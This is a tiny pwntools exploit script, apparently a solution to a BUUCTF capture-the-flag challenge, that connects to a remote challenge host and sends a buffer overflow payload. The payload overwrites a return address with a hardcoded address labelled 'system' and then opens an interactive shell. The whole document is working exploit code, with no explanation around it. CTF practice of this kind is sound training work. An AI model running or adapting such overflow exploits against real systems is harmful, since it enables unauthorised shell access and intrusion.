from pwn import *
sh = remote("node5.buuoj.cn",25899)
system=0x8048F0D

payload = b"I"*21+b"a"*1+p32(system)
sh.sendline(payload)
sh.interactive()
